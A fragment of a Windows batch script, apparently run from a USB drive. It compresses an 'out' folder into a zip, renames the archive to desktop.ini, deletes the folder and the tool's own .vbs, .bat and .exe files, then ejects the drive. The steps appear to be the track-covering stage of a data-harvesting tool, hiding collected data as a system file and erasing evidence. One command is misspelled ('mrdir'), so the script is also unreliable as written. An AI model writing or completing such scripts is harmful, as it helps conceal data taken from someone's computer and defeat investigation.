powershell Compress-Archive -Path %CD:~0,2%\out -DestinationPath %CD:~0,2%\out.zip
rename out.zip desktop.ini
mrdir out /s /q
del *.vbs
del nay.bat
RemoveDrive.exe %CD:~0,2% -L -F
del *.exe
